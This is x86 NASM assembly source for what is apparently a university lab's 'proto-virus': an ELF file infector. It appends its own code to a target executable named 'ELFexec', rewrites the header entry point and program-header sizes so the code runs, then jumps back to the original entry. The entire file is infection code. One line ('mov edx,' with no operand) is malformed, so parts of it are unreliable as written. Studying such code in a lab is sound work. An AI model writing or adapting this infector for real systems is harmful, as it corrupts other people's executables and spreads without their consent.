%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define e_ehsize   40
%define size_of_file 274
	
global _start

section .text
_start:	
	push	ebp
	mov		ebp, esp
	sub		esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	call 	IndependedText
	sub 	edx, IndependedTextTrick-OutStr
	mov 	ebx, edx
	write 	1, ebx, 32

	call 	IndependedText
	sub 	edx, IndependedTextTrick-FileName
	mov 	ebx, edx
	open 	ebx, RDWR, 0777
	cmp		eax, 0
	jl 		VirusFailed
	mov 	[ebp], eax				; save file descriptor

	mov		ebx, ebp
	sub 	ebx, 8
	read	[ebp], ebx, 4 			; read elf
	cmp 	eax, 4
	jl 		VirusFailed

	cmp 	byte [ebp-7], 'E'
	jne 	VirusFailed
	cmp 	byte [ebp-6], 'L'
	jne 	VirusFailed
	cmp 	byte [ebp-5], 'F'
	jne 	VirusFailed

	lseek 	[ebp], 0, SEEK_END
	cmp 	eax, SEEK_SET
	jle 	VirusFailed
	mov 	[ebp-4], eax 			; save end of file

	mov 	ebx, virus_end
	sub 	ebx, _start	
	call 	IndependedText
	sub 	edx, IndependedTextTrick-_start
	mov 	eax, edx
	write	[ebp], eax, ebx
	cmp 	eax, 0
	jl 		VirusFailed
	
	close 	[ebp]
	jl 		VirusFailed

	call 	CopyHeaderToStuck
	call  	ModifyCopyEntry
	call 	SaveCopyToFile

	call 	IndependedText
	sub 	edx, IndependedTextTrick-PreviousEntryPoint
	jmp 	[edx]

CopyHeaderToStuck:						; copy the elf header file to STK_RES place of the memory and above.\
	mov 	edx, 
	call 	IndependedText
	sub 	edx, IndependedTextTrick-FileName
	mov 	ebx, edx
	open 	ebx, RDWR, 0777
	cmp		eax, 0
	jl 		VirusFailed
	mov 	[ebp], eax					; save file descriptor

	mov 	ebx, ebp
	sub 	ebx, STK_RES
	read 	[ebp], ebx, 50
	cmp 	eax, 0
	jl 		VirusFailed

	ret

ModifyCopyEntry:
	mov 	eax, [ebp-STK_RES+ENTRY]
	mov 	[ebp-8], eax

	lseek 	[ebp], PHDR_start, SEEK_SET
	mov 	ebx, ebp
	sub 	ebx, 104
	read 	[ebp], ebx, 4 			; read program header address

	mov 	ebx, [ebp-104]
	lseek 	[ebp], ebx, SEEK_SET

	mov 	ebx, ebp
	sub 	ebx, 100
	read 	[ebp], ebx, PHDR_size 			; read program header table
	mov 	ebx, [ebp-100+PHDR_vaddr]		; get the virtual address
	add 	ebx, [ebp-4]					; virtual adress + size of file(274) = 0x8048274
	mov 	dword [ebp-STK_RES+ENTRY], ebx 	; 0x8048274

	mov 	ebx, [ebp-100+PHDR_filesize] 		; get the FileSiz
	call 	IndependedText
	sub 	edx, IndependedTextTrick-_start
	sub 	ebx, edx
	call 	IndependedText
	sub 	edx, IndependedTextTrick-virus_end
	add 	ebx, edx
	mov 	[ebp-100+PHDR_filesize], ebx	; set the FileSiz

	mov 	ebx, [ebp-100+PHDR_memsize] 		; get the memsize
	call 	IndependedText
	sub 	edx, IndependedTextTrick-_start
	sub 	ebx, edx
	call 	IndependedText
	sub 	edx, IndependedTextTrick-virus_end
	add 	ebx, edx
	mov 	[ebp-100+PHDR_memsize], ebx			; set the memsize

	mov 	ebx, [ebp-104]
	lseek 	[ebp], ebx, SEEK_SET

	mov 	ebx, ebp
	sub 	ebx, 100
	write 	[ebp], ebx, PHDR_size 			; read program header table

	close 	[ebp]
	ret

SaveCopyToFile:
	call 	IndependedText
	sub 	edx, IndependedTextTrick-FileName
	mov 	ebx, edx
	open 	ebx, RDWR, 0777
	cmp		eax, 0
	jl 		VirusFailed
	mov 	[ebp], eax					; save file descriptor

	mov 	ebx, ebp
	sub 	ebx, STK_RES
	write	[ebp], ebx, 50

	mov 	eax, [ebp-4]
	add 	eax, virus_end-_start-4
	lseek 	[ebp], eax, SEEK_SET
	mov 	eax, ebp
	sub 	eax, 8
	write 	[ebp], eax, 4

	close 	[ebp]
	ret

VirusExit:
    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
VirusFailed:
	call 	IndependedText
	sub 	edx, IndependedTextTrick-Failstr
	mov 	ebx, edx
	write 	1, ebx, 13
	call 	IndependedText
	sub 	edx, IndependedTextTrick-PreviousEntryPoint
	jmp 	[edx]
	;exit -1


FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

IndependedText:
	call IndependedTextTrick
IndependedTextTrick:
	pop edx
	ret

PreviousEntryPoint: dd VirusExit
virus_end: